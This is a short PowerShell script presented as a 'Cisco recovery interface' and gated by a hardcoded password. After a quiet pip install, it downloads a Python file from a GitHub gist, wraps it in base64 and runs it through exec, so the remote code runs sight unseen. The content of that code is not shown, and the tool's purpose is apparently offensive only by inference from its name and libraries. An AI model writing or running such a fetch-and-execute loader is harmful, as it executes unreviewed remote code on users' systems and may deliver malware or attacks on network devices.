# BHOOMI REMOTE INTERFACE
Clear-Host
$C = [ConsoleColor]::Cyan

Write-Host "--- BHOOMI CISCO RECOVERY INTERFACE ---" -ForegroundColor $C
$pass = Read-Host "Enter Access Password"

if ($pass -eq "Dinesh") {
    Write-Host "[+] Authentication Successful." -ForegroundColor Green
    
    # 1. Ensure dependencies
    python -m pip install requests colorama urllib3 --quiet

    # 2. Fetch the Engine (Using the permanent Raw link)
    $url = "https://gist.githubusercontent.com/urflameww/e0685a4f3ab6325dceda596f7f45d611/raw/Bhoomi.py"
    $code = (New-Object Net.WebClient).DownloadString($url)
    
    # 3. Convert to Base64 to bypass all Syntax & Character errors
    $bytes  = [System.Text.Encoding]::UTF8.GetBytes($code)
    $encoded = [Convert]::ToBase64String($bytes)
    
    # 4. Execute using a clean, one-line command
    python -c "import base64; exec(base64.b64decode('$encoded').decode('utf-8'))"
} else {
    Write-Host "[-] Access Denied." -ForegroundColor Red
    Start-Sleep -Seconds 2
}
